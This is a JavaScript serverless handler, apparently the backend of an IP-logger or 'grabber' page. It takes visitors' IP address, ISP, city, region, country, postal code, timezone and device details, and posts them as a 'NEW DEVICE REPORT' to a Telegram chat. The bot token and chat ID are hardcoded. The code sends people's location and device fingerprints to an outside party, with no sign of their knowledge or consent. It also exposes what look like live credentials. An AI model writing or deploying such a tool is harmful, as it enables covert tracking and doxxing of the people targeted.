import axios from 'axios';

// Detect OS from user-agent
function detectOS(userAgent) {
  userAgent = userAgent.toLowerCase();
  if (/windows phone/.test(userAgent)) return 'Windows Phone';
  if (/windows/.test(userAgent)) return 'Windows';
  if (/android/.test(userAgent)) return 'Android';
  if (/ipad|iphone|ipod/.test(userAgent)) return 'iOS';
  if (/mac os x/.test(userAgent)) return 'macOS';
  if (/linux/.test(userAgent)) return 'Linux';
  if (/cros/.test(userAgent)) return 'Chrome OS';
  return 'Unknown';
}

// Escape HTML to avoid Telegram parse_mode errors
function escapeHTML(text) {
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).end('Method Not Allowed');
  }

  const data = req.body;
  const userAgent = req.headers['user-agent'] || '';
  data.os = detectOS(userAgent);

  const date = new Date().toLocaleString('en-US', {
    timeZone: 'Asia/Manila'
  });

  // Telegram message (HTML format)
  const message = `
<b>📡 NEW DEVICE REPORT</b>
<b>🕒 Time:</b> ${escapeHTML(date)}

<b>🌐 Network Info</b>
• IP: ${escapeHTML(data.ip || 'Unknown')}
• ISP: ${escapeHTML(data.isp || 'Unknown')}
• Location: ${escapeHTML(data.city || 'Unknown')}, ${escapeHTML(data.region || 'Unknown')}, ${escapeHTML(data.country || 'Unknown')}
• Timezone: ${escapeHTML(data.timezone || 'Unknown')}
• Postal: ${escapeHTML(data.postal || 'Unknown')}

<b>💻 Device Info</b>
• OS: ${escapeHTML(data.os || 'Unknown')}
• Browser: ${escapeHTML(data.browser || 'Unknown')}
• Mobile: ${escapeHTML(String(data.mobile))}
• RAM: ${escapeHTML(String(data.memory ?? 'Unknown'))} GB
• Battery: ${escapeHTML(String(data.battery ?? 'Unknown'))}% (Charging: ${escapeHTML(String(data.charging ?? 'Unknown'))})
• Screen: ${escapeHTML(data.screen || 'Unknown')}
• Viewport: ${escapeHTML(data.viewport || 'Unknown')}
`;

  // 🔑 YOUR TELEGRAM CREDENTIALS
  const BOT_TOKEN = '8331507630:AAFB9CwWfEkbZ9xH9NHG7VBAzrVLBVmZCR8';
  const CHAT_ID = '-1003325796934';

  try {
    await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      }
    );

    console.log('[+] Sent device info to Telegram');
    return res.status(200).json({ success: true });

  } catch (err) {
    console.error(
      '[!] Failed to send to Telegram:',
      err.response?.data || err.message
    );
    return res.status(500).json({ error: 'Failed to send to Telegram' });
  }
}
